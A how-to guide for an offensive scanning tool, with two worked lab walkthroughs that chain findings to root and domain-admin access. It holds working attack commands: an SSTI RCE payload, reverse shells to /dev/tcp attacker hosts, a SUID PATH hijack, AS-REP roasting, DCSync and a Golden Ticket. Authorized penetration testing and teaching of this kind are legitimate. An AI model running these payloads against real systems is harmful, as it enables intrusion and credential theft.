# ngehe — How To

Practical walkthrough. Pairs with [README.md](README.md), which covers what ngehe is and which detectors it ships.

## Prerequisites

- Go 1.22+ to build from source.
- `nmap` on PATH (`ngehe box` shells out to it).
- A target you are authorized to test (your own app, HTB / TryHackMe / PortSwigger lab, or a CTF box).

Easiest install — the bundled `install.sh` handles `nmap` and the build:

```bash
git clone https://github.com/chud-lori/ngehe.git
cd ngehe
sudo ./install.sh        # /usr/local/bin
# or
PREFIX=$HOME/.local ./install.sh   # ~/.local/bin

ngehe doctor            # verify required deps are present
```

Recommended companion tools (ngehe will hand off to these — install separately):

- **hashcat** — crack the JWT / `krb5asrep` / `krb5tgs` hashes ngehe produces.
- **sqlmap** — once ngehe flags `sqli-error-based` or `sqli-time-based`, sqlmap takes it from there.
- **BloodHound** — ingest ngehe's `users.json` / `computers.json` / `groups.json` for AD path analysis.
- **impacket** — heavier AS-REP / Kerberoast / NTLM relay than ngehe's MVP versions.

## The HTB / Box Workflow

This is the order ngehe is designed to run in for a fresh target.

### Step 0 — Full-Spectrum Box Scan

If you have just an IP, start here:

```bash
ngehe box --target 10.10.11.5 --domain target.htb --markdown box.md
```

What it does:

1. Shells out to `nmap` (must be installed) with the **quick** profile by default (`-sV --top-ports 100 -Pn -T4`). Use `--profile full` for all ports, or `--profile service` for `-sV -sC -p-` (slow but thorough).
2. For each open port nmap identifies a service for, dispatches to a per-service scanner:

   - **SSH** → banner + version-based CVE hints + auth method enumeration
   - **FTP** → anonymous login + listing
   - **SMB** (microsoft-ds, netbios-ssn) → null / anonymous / guest enumeration + share list
   - **LDAP** → anonymous bind + Root DSE + user list + AS-REP-roastable accounts
   - **SNMP** → 32 common community strings
   - **DNS** → AXFR zone transfer + ~200 subdomain bruteforce (requires `--domain`)
   - **MySQL / Postgres / MSSQL / Redis** → default credential check + version capture
   - **HTTP / HTTPS / http-alt** → runs the full `ngehe recon` flow (fingerprint + sensitive-files + dir-bruteforce)

3. Aggregates all findings into one JSONL + markdown report.

Useful flags:

```bash
--profile full          # nmap -p- (all 65k ports, takes much longer)
--profile service       # nmap -sV -sC -p- (very thorough)
--top 500               # wordlist depth for web recon / DNS / vhost
--no-web                # skip web recon (faster if you only care about non-HTTP services)
--domain target.htb     # required for DNS subdomain bruteforce; otherwise DNS is skipped
```

**Reading the output:**

```bash
# Critical + high findings only
jq 'select(.severity == "critical" or .severity == "high")' box.jsonl

# What services are open
jq -r 'select(.rule == "port-open") | .url' box.jsonl

# Any default creds?
jq 'select(.rule | test("default-creds"))' box.jsonl
```

### Step 1 — Recon

You usually start with just an IP and an open port. Get a snapshot of what's running.

```bash
ngehe recon --target http://10.10.11.5 --markdown recon.md
```

What it does:

1. **Tech fingerprint.** Reads `Server`, `X-Powered-By`, cookies, and body markers to identify the stack (nginx/Apache, PHP/ASP.NET/Express, WordPress/Drupal/Magento, Tomcat/Jenkins, etc.).
2. **Sensitive files.** Probes for `.git/HEAD`, `.env`, AWS credentials, `phpinfo`, `server-status`, backups, swagger docs. Uses **content fingerprinting** (e.g., `.git/HEAD` must contain `ref: refs/heads/`) so a catch-all router can't fake a positive.
3. **Directory bruteforce.** Walks the SecLists `common.txt` wordlist (4750 entries) and reports paths returning non-404. 401/403 paths are upgraded to MEDIUM — those are real endpoints that just require auth.

Useful flags:

```bash
--top 800            # limit each wordlist to top N (default 500); 0 = full
--concurrency 30     # how many parallel probes (default 20)
--skip-dirbust       # skip the directory walk (faster recon)
--timeout-ms 5000    # per-request timeout
```

Reading the output: filter to actionable findings first.

```bash
jq 'select(.severity == "high" or .severity == "critical")' recon.jsonl
jq -r 'select(.rule == "dir-discovery") | .path' recon.jsonl
```

### Step 2 — Browse + Capture

Open the box's web app in a browser proxied through Burp / mitmproxy / Chrome DevTools. Click around, log in, do a few real flows. Export to HAR.

**Chrome DevTools:** Network tab → "Preserve log" → right-click → "Save all as HAR with content".

**mitmproxy:** `mitmproxy --listen-port 8080 --set hardump=capture.har`.

The richer the HAR, the better ngehe's findings — every captured request becomes an injection target.

### Step 3 — Configure

```bash
ngehe init --out ngehe.yaml
```

A complete config for an HTB box looks like this:

```yaml
scope:
  hosts:
    - 10.10.11.5
  include_paths:
    - /
  exclude_paths:
    - /assets/
    - /static/
    - /api/health
  methods: [GET, POST, PUT, PATCH, DELETE]

sessions:
  - name: alice
    login:
      method: POST
      url: http://10.10.11.5/login
      content_type: application/x-www-form-urlencoded
      body: 'username=alice&password=alice123'
      token_jsonpath: token
  - name: bob
    bearer: eyJhbGciOi...

replay:
  concurrency: 4
  include_anon: true
  timeout_ms: 10000

detectors:
  bola: true
  id_mutation: true
  mass_assign: true
  jwt_abuse: true
  sqli: true
  cmd_injection: true
  ssti: true
  lfi: true
  ssrf: true
  xss: true
  default_creds: true
  jwt_probe_url: http://10.10.11.5/api/me
  default_creds_urls:
    - http://10.10.11.5/admin/login|user=username,password=password
```

Notes:

- **`scope.hosts`** is the safety boundary. ngehe will refuse to send requests to hosts not listed here, even if the HAR contains them.
- **Sessions** can use `bearer:` (direct token) or `login:` (ngehe performs the login at scan start and extracts a token via `token_jsonpath`).
- **`jwt_probe_url`** is the small idempotent authenticated endpoint ngehe fires JWT abuse checks against (`/me`, `/profile`, etc.). Pick one that returns clean 2xx on a valid token and 401 on an invalid one.
- **`default_creds_urls`** is a list of login endpoints to test. The pipe-syntax modifier customizes field names and JSON mode:
  - `http://host/login` — default form fields `username`/`password`
  - `http://host/login|user=email,password=passwd` — custom field names
  - `http://host/api/login|user=email,password=passwd,json` — JSON body

### Step 4 — Active Scan

```bash
ngehe scan \
  --har capture.har \
  --config ngehe.yaml \
  --out findings.jsonl \
  --markdown findings.md
```

Progress reports to stderr per detector:

```text
loaded 47 in-scope requests
loaded 2 sessions
bola: 6 findings
id-mutation: 3 findings
mass-assign: 11 findings
jwt-abuse: 4 findings
sqli: 1 findings
cmdi: 1 findings
ssti: 0 findings
lfi: 1 findings
ssrf: 0 findings
xss: 2 findings
default-creds: 1 findings
total: 30 findings
```

## From Finding to Box: the Attack Chain

ngehe identifies vulnerabilities. **It does not chain them to root automatically** — that's still your job, but every finding ships with an actionable `next` field telling you the concrete payload or command.

Open `findings.md`. The top of the report has a **"Suggested attack chain"** section ordered by exploitability. Each entry includes:

- The rule and the endpoint
- The exact payload that triggered the bug
- A `next` block: literal commands / payloads / hashcat invocations to move forward

Typical chains by finding type:

| Finding | Chain to root |
|---|---|
| `cmdi-marker` / `cmdi-time-based` | RCE → reverse shell with `nc -lvnp 4444` listener + `;bash -c "bash -i >&/dev/tcp/ATTACKER/4444 0>&1"` payload |
| `ssti` | Template payload like `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` → RCE → reverse shell |
| `lfi-path-traversal` | Read `/root/.ssh/id_rsa` for SSH foothold; or log poisoning + LFI to RCE |
| `sqli-error-based` / `sqli-time-based` | `sqlmap -u "<URL>" --batch --dump`; for MSSQL try `xp_cmdshell` for RCE |
| `sensitive-file` (.git/HEAD) | `git-dumper <url>/.git . && grep -rE "(password\|secret\|token)" .` |
| `sensitive-file` (.env) | Read DB creds, `SECRET_KEY`, AWS keys directly |
| `ssrf` (cloud metadata) | Pivot to AWS IAM creds: extract from `/latest/meta-data/iam/security-credentials/<role>` → use with `aws-cli` |
| `default-credentials` | Log in → look for command-exec admin pages (Tomcat Manager: deploy WAR) or file upload (webshell) |
| `jwt-alg-none` / `jwt-weak-secret` | Forge admin token → access privileged endpoints |
| `mass-assign-reflected` | Re-register / re-PUT with `"role":"admin"` to elevate yourself |
| `ftp-anonymous-allowed` | `wget -r ftp://anonymous@host/` — look for `id_rsa`, configs, backups |
| `smb-null-session-allowed` | `enum4linux-ng -A host` for full enumeration |
| `ldap-asrep-roastable` | `hashcat -m 18200 hash.txt rockyou.txt` to crack the user's password |
| `kerberos-asrep-roast` / `kerberos-kerberoast` | `hashcat -m 18200` / `-m 13100` against rockyou |
| `bloodhound-collect` | Open BloodHound CE → ingest → "Shortest paths to Domain Admins" |
| `db-no-auth-redis` | Write SSH key via Redis CONFIG SET → SSH in as root |
| `db-default-creds-mssql` | `xp_cmdshell` for OS RCE: `EXEC xp_cmdshell 'whoami'` |

`jq` filter to see just the chain candidates:

```bash
jq -r 'select(.severity == "critical" or .severity == "high") | "[\(.severity)] \(.rule)\n  url: \(.url)\n  next: \(.next)\n"' findings.jsonl
```

## Reading Findings

JSONL fields:

```json
{
  "rule": "sqli-error-based",
  "severity": "high",
  "method": "GET",
  "url": "http://10.10.11.5/api/search?q=%27",
  "path": "/api/search",
  "param": "query:q",
  "payload": "'",
  "evidence": "SQLite error: unrecognized token",
  "why": "payload triggered a database error string in the response"
}
```

Filter for what matters:

```bash
# Critical + high only
jq 'select(.severity == "critical" or .severity == "high")' findings.jsonl

# One line per finding, grouped
jq -r '"\(.severity)\t\(.rule)\t\(.method) \(.path)\t\(.param)"' findings.jsonl \
  | sort -u

# Just the rules that fired
jq -r .rule findings.jsonl | sort | uniq -c | sort -rn
```

## Non-Web Scanner Notes (ngehe box)

### SSH

`ngehe box` flags known-vulnerable OpenSSH and libssh versions from the banner. Pay attention to:

- **`ssh-libssh-auth-bypass`** — libssh ≤ 0.8.3 has CVE-2018-10933, complete authentication bypass via crafted SSH_MSG_USERAUTH_SUCCESS. Critical.
- **`ssh-cve-2018-15473`** — OpenSSH ≤ 7.7 username enumeration. Use the leaked user list with `kerbrute` or hydra.
- **`ssh-auth-methods`** lists what auth modes the server accepts. `publickey,password` is typical. `publickey` only means you need a leaked key.
- **`ssh-none-auth-allowed`** — fire-and-forget critical: server allows `none` auth, anyone can log in.

### FTP

`ftp-anonymous-allowed` plus `ftp-anonymous-listing` are the gold finds. If you see a writable directory in the listing, try uploading a web shell (if the FTP root is web-served).

### SMB

The current implementation tries null / anonymous / guest sessions with `go-smb2`. A working session lists shares. **It does not currently do SMB version detection beyond what nmap provides** — for `MS17-010` / EternalBlue era boxes, run `nmap --script smb-vuln-ms17-010` separately.

### LDAP

`ldap-anonymous-bind` is medium-severity; many AD configs allow it but most leaks come from the data it exposes:

- **`ldap-root-dse`** — domain controller info: hostname, naming context, functional level. Tells you the domain name (often the realm for Kerberos attacks).
- **`ldap-user-enum`** — full domain user list. Save this as `users.txt` and feed to AS-REP roast, password spray, kerberoast.
- **`ldap-asrep-roastable`** — accounts with `DONT_REQ_PREAUTH` set. These are immediately AS-REP roastable without credentials.

### Kerberos (AS-REP roast + Kerberoast)

The Go primitives are in `internal/scanner/kerberos/`. Calling pattern (from a future CLI subcommand or programmatic use):

```go
// AS-REP roast — no creds required.
hashes := kerberos.ASREPRoast(kdcHost, "CORP.LOCAL", []string{"alice", "bob", "svc.web"})

// Kerberoast — requires a valid (low-priv) domain account.
hashes := kerberos.Kerberoast(kdcHost, "CORP.LOCAL", "alice", "Password123!",
    []string{"HTTP/web.corp.local", "MSSQLSvc/sql.corp.local:1433"})
```

Hashes are emitted in **hashcat format**: `$krb5asrep$23$...` (mode 18200) and `$krb5tgs$23$*...*$...$...` (mode 13100). Feed to hashcat with `hashcat -m 18200 hashes.txt rockyou.txt` (or `-m 13100`).

For complex AD scenarios — DCSync, S4U, RBCD, Certipy, NTLM relay — use `impacket` and `BloodHound`. ngehe covers the basics.

### BloodHound collection

```go
findings, _ := bloodhound.Collect(bloodhound.Options{
    Host:   "10.10.11.5",
    User:   "alice",
    Pass:   "Password123!",
    Domain: "corp.local",
    OutDir: "./bh-zip",
})
```

Output: `users.json`, `computers.json`, `groups.json` in BloodHound schema v5. Zip them and import via BloodHound CE / Legacy.

This is a **subset** of SharpHound's collection — no ACLs, no sessions, no local-admin enumeration. For deeper collection use SharpHound (Windows) or bloodhound-python.

### Databases

`db-default-creds-*` and `db-no-auth-redis` are the wins. After a hit:

- **MySQL/Postgres**: read `information_schema` / `pg_user`, look for app secrets.
- **MSSQL**: try `xp_cmdshell` for RCE — `EXEC xp_cmdshell 'whoami'` over the `db-default-creds-mssql` connection.
- **Redis**: try `CONFIG SET dir`, `CONFIG SET dbfilename`, then `SAVE` — classic SSH key write to authorized_keys for RCE.

### NTLM password spray

```go
ntlm.Spray("http://target/api/protected", "CORP", []string{"alice","bob"}, []string{"Spring2026!","Summer2026!"})
```

Used against intranet web apps with Windows Authentication. Critical: be careful with account lockout — many AD policies lock at 5 failures.

## Per-Detector Notes

### BOLA / id-mutation / broken-auth

You need **at least two sessions** for BOLA to mean anything. With one session ngehe will still run id-mutation (mutates IDs across other captured requests).

The body-similarity score in each finding tells you what kind of match:

- **≥ 0.6**: same resource — strong BOLA evidence.
- **0.2 – 0.6**: partial overlap — could be a shared listing endpoint (review manually).
- **< 0.2**: only structural similarity — likely a per-user endpoint, demoted to LOW.

### Mass-assignment

`mass-assign-reflected` (HIGH) is what you want — server echoed an injected `isAdmin`/`role`/`owner`. `mass-assign-accepted` (LOW) just means the request didn't get rejected — the server may be silently binding the field, or it may be ignoring it. **Confirm by fetching the resource and inspecting its full state** after a "successful" inject.

### JWT abuse

Each rule names the specific trust failure (alg=none, weak secret, no exp/iss/aud check). All are real bugs. If `jwt_probe_url` is wrong (e.g., doesn't require auth) every tampered token will "pass" and you'll get false positives — verify the URL returns 401 for an invalid token first.

### SQLi / CMDi / SSTI / LFI / SSRF / XSS

These inject payloads into every query parameter and JSON string field of every captured request. Some sensitive notes:

- **SQLi time-based** can be slow on slow targets — each candidate parameter waits ~5s.
- **CMDi-marker** is baseline-aware: ngehe first sends a non-shell-meta marker per param and skips that param if it reflects, so plain echo endpoints don't false-positive.
- **SSTI** marker is `1337*1331 → 1779547`; if that exact digit string is anywhere in normal responses (unlikely), the param is skipped.
- **LFI** markers cover Linux and macOS `/etc/passwd` plus Windows `win.ini` and PHP `php://filter` wrappers.
- **SSRF** probes cloud metadata endpoints (AWS, GCP, Azure) plus `file://`, loopback HTTP, gopher, dict. Requires the target to actually be able to reach those endpoints — local test demos may need a canary URL.
- **XSS** is reflected-only, detected by an unencoded marker tag. DOM XSS isn't covered.

### Default credentials

Spec each login URL in `detectors.default_creds_urls`. ngehe tries 33 curated web-admin credentials by default (admin:admin, root:root, tomcat:tomcat, ...). Success is detected by status transition (4xx → 2xx/302) plus a new session cookie or different body.

If you've discovered a less-common login form, set the field names with the pipe syntax:

```yaml
default_creds_urls:
  - http://target/login|user=email,password=passwd,json
```

## CI Integration

Fail the build on any HIGH or CRITICAL finding:

```bash
ngehe scan --har $CAPTURE --config ngehe.yaml --out findings.jsonl
HIGH=$(jq -c 'select(.severity == "high" or .severity == "critical")' findings.jsonl | wc -l)
if [ "$HIGH" -gt 0 ]; then
  echo "ngehe found $HIGH critical/high-severity issues"
  exit 1
fi
```

Keep capture files and tokens out of source control. Generate them from short-lived test credentials inside the CI environment.

## Worked HTB Walkthroughs

Two end-to-end scenarios that show how ngehe's output maps to an actual box-pwning workflow. Both are realistic composites of common HTB patterns, not specific boxes (no spoilers).

### Walkthrough 1 — Web-flavored Linux box (SSTI → user shell → SUID → root)

You spawn an HTB box. The dashboard says it's at `10.10.11.42`. You add it to `/etc/hosts` as `box.htb` and start.

```bash
# Step 0 — sanity check ngehe + deps
ngehe doctor

# If nmap is missing:
#   Linux:  sudo apt install nmap   (or dnf install nmap / pacman -S nmap)
#   macOS:  brew install nmap
```

**Step 1 — full-spectrum scan.**

```bash
ngehe box --target 10.10.11.42 --domain box.htb \
  --profile quick --markdown box.md --top 800
```

Real-looking output to stderr:

```text
ngehe box → 10.10.11.42 (profile=quick)
running: nmap -T4 -Pn --open -sV -oX - --top-ports 100 10.10.11.42
port-scan: 3 open services
tcp/22 ssh                     → 2 findings
tcp/80 http                    → 47 findings
tcp/53 domain                  → 1 findings
total: 50 findings
```

**Step 2 — read the attack chain at the top of `box.md`.**

```markdown
## Suggested attack chain

1. [CRITICAL] ssti — GET /api/render
   param: query:msg  payload: {{1337*1331}}
   evidence: Jinja2/Twig/Liquid evaluated 1337*1331 → 1779547

   RCE via template. Engine identified in evidence — chain to OS commands:
     Jinja2:    {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
     ...

2. [HIGH] sensitive-file — GET /.env
   evidence: 88 bytes; preview: "DATABASE_URL=postgres://app:hunter2@localhost/app
                                 SECRET_KEY=super-secret"

   Read the file then escalate:
     .env → read env vars (DB creds, SECRET_KEY for session forging, AWS keys)
     ...

3. [HIGH] dns-axfr-allowed — TCP dns://10.10.11.42:53/box.htb.
   evidence: dev.box.htb. IN A 10.10.11.42 / admin.box.htb. IN A 10.10.11.42 / ...

   Zone transferred. Add every hostname to /etc/hosts and treat them as new vhost targets.
```

**Step 3 — go after the SSTI first** (highest impact, has a clean RCE chain).

Use the payload from the chain. URL-encode the braces and confirm RCE:

```bash
curl -G "http://box.htb/api/render" \
  --data-urlencode "msg={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

# Returns something like:
# {"rendered":"Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
```

Confirmed: arbitrary OS commands as `www-data`. Catch a reverse shell.

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — fire the reverse shell payload (replace IP with your tun0)
curl -G "http://box.htb/api/render" --data-urlencode \
  "msg={{config.__class__.__init__.__globals__['os'].popen('bash -c \"bash -i >& /dev/tcp/10.10.14.7/4444 0>&1\"').read()}}"
```

You catch the shell. Upgrade to a proper TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
export TERM=xterm
```

**Step 4 — get user.txt and look for privesc paths.**

```bash
cat /home/*/user.txt                        # capture user flag
find / -perm -4000 -type f 2>/dev/null      # SUID binaries
sudo -l                                     # what can www-data sudo as?
cat /etc/crontab                            # any privileged cron?
```

You spot `/usr/local/bin/backup-tool` is SUID-root. `strings` reveals it calls `tar` without an absolute path. Classic PATH-hijack:

```bash
echo '#!/bin/bash
chmod +s /bin/bash' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup-tool        # now runs your tar as root
/bin/bash -p                       # SUID bash → root shell
```

**Step 5 — root.txt.**

```bash
cat /root/root.txt
```

That's a representative chain. ngehe found the initial RCE and gave you the exact payload. Manual work was upgrading the shell and chaining to root.

---

### Walkthrough 2 — Active Directory box (LDAP enum → AS-REP roast → BloodHound → DCSync → DA)

Box at `10.10.11.99`, domain `corp.htb`. Add both to `/etc/hosts`.

**Step 1 — full-spectrum scan.**

```bash
ngehe box --target 10.10.11.99 --domain corp.htb \
  --profile service --markdown box.md
```

Output:

```text
tcp/53 domain                  → 1 findings
tcp/88 kerberos-sec            → 0 findings    (just open; no deep probing yet)
tcp/135 msrpc                  → 0 findings
tcp/139 netbios-ssn            → 1 findings
tcp/389 ldap                   → 3 findings
tcp/445 microsoft-ds           → 2 findings
tcp/3268 globalcatLDAP         → 0 findings
total: 12 findings
```

Top of `box.md`:

```markdown
## Suggested attack chain

1. [HIGH] ldap-asrep-roastable — TCP ldap://10.10.11.99:389/
   evidence: svc-helpdesk, kiosk, guest-printer

   ngehe's kerberos.ASREPRoast will produce hashes — or use impacket:
   GetNPUsers.py corp.htb/ -no-pass -usersfile users.txt

2. [MEDIUM] ldap-user-enum — TCP ldap://10.10.11.99:389/
   evidence: administrator, krbtgt, alice, bob, svc-helpdesk, ...
   enumerated 47 domain users via LDAP — feed into kerbrute / AS-REP roast / spray

3. [HIGH] smb-anonymous-allowed — TCP smb://10.10.11.99:445/
   evidence: shares: IPC$, NETLOGON, SYSVOL, public
```

**Step 2 — AS-REP roast the flagged accounts.**

```bash
# Save the user list ngehe produced
jq -r 'select(.rule == "ldap-user-enum") | .evidence' box.jsonl \
  | tr ',' '\n' | sed 's/^ *//' > users.txt

# AS-REP roast (using impacket — the playbook hint points you here)
GetNPUsers.py corp.htb/ -no-pass -usersfile users.txt -outputfile asrep.hashes
```

Roast yields a hash for `svc-helpdesk`. Crack it:

```bash
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
# svc-helpdesk:Welcome1!
```

**Step 3 — pivot inside AD.** You're now a domain user. Run BloodHound's collector (or use ngehe's Go primitives once wired):

```bash
bloodhound-python -u svc-helpdesk -p 'Welcome1!' -d corp.htb \
  -ns 10.10.11.99 -c all
```

Import the JSON into BloodHound CE. Run "Shortest paths to Domain Admins" from `SVC-HELPDESK@CORP.HTB`:

```
SVC-HELPDESK → MemberOf → HELPDESK group → ForceChangePassword → SYSADMINS group → AdminTo → DC01
```

`ForceChangePassword` on a sysadmin account is the lever.

**Step 4 — exploit the ACL.**

```bash
# Reset bob's password (bob is in SYSADMINS)
net rpc password 'bob' -U 'corp.htb/svc-helpdesk%Welcome1!' -S 10.10.11.99
# (enter a new password — Pwn3d2026!)
```

**Step 5 — DCSync as bob → krbtgt → Golden Ticket → DA.**

```bash
# Dump every domain hash including krbtgt
secretsdump.py corp.htb/bob:'Pwn3d2026!'@10.10.11.99 -just-dc

# Forge a Golden Ticket
ticketer.py -nthash <krbtgt-nt-hash> -domain-sid <SID> \
  -domain corp.htb administrator
export KRB5CCNAME=administrator.ccache

# WinRM in as Domain Admin
evil-winrm -i 10.10.11.99 -u administrator -H <admin-nt-hash>

# Loot
type C:\Users\Administrator\Desktop\root.txt
```

ngehe gave you the user list, the AS-REP-roastable subset, and the playbook of what to do next. The remaining work — Kerberos cracking, graph analysis, AD takeover — uses dedicated tools (`hashcat`, `BloodHound`, `impacket`) that already do those jobs well.

---

### What ngehe did and didn't do for you in those walkthroughs

**ngehe did:**
- Discovered open ports + identified services (via nmap)
- Found the SSTI bug + told you the exact engine + gave you the RCE payload
- Surfaced the .env / .git / sensitive files
- Got the DNS zone transfer (Walkthrough 1)
- Enumerated AD users + flagged AS-REP-roastable accounts (Walkthrough 2)
- Identified SMB anonymous access (Walkthrough 2)
- Bundled all of that into a Suggested attack chain at the top of the markdown report — including the literal commands for what to do next

**You did manually:**
- Crafted the reverse-shell payload (substituted your attacker IP)
- Upgraded the shell to a TTY
- Found the SUID privesc (next time, automate with `linpeas` / `winpeas`)
- Ran hashcat (ngehe outputs hashcat-format; doesn't crack)
- Used BloodHound's graph (ngehe emits the JSON; BloodHound visualizes)
- DCSynced (out of ngehe's scope today; use `impacket`)

The split is intentional: ngehe automates **discovery + initial-exploitation evidence**. Cracking, graph analysis, AD takeover are dedicated jobs handled by `hashcat`, `BloodHound`, and `impacket` respectively.

## End-to-End Demo

The repository ships a deliberately vulnerable demo API with a planted bug for every detector:

```bash
# Terminal 1
cd examples/vuln-api && go run .

# Terminal 2
cd ../.. 
ngehe recon --target http://127.0.0.1:8787 --top 800 --markdown recon.md
ngehe scan --har examples/vuln-api/alice.har --config examples/vuln-api/ngehe.yaml --markdown findings.md
```

You should see findings from every active detector. Read `examples/vuln-api/main.go` to see which bugs were planted; every HIGH/CRITICAL finding should map to one of them.

## Troubleshooting

| Symptom | Likely cause |
|---|---|
| `loaded 0 in-scope requests` | `scope.hosts` doesn't match the host in the HAR. Hosts include the port. |
| Login fails at scan start | `token_jsonpath` wrong or login URL unreachable. |
| Every BOLA finding looks like a false positive | Baseline session not detected. Either supply the captured user's exact bearer in the session config, or ensure the JWT `sub` claim matches `session.Name`. |
| JWT abuse fires zero | `jwt_probe_url` empty, or returns non-2xx for valid tokens, or sessions use opaque tokens instead of JWTs. |
| SQLi/CMDi/SSTI fire zero on a known-vulnerable target | The target's response may not match ngehe's oracles. SQLi needs DB error strings or measurable time delays. CMDi-marker needs shell execution to surface the marker; CMDi-time needs sleep to take effect (network jitter on slow boxes can hide ~1s deltas). |
| Recon dir-bruteforce skipped with "catch-all SPA?" | The target returns 200/302 for any random path — a single-page app or catch-all router. Manual review needed; the bruteforce can't distinguish real endpoints. |

## See Also

- [README.md](README.md) — what ngehe is and which detectors it ships.
- [`examples/vuln-api/`](examples/vuln-api/) — runnable target with planted bugs for every detector.
- [`internal/wordlist/NOTICE.md`](internal/wordlist/NOTICE.md) — SecLists attribution.
- [cornela](https://github.com/chud-lori/cornela) — kernel-level container audit (host defense).
- [milog](https://github.com/chud-lori/milog) — nginx + system monitor (log defense).
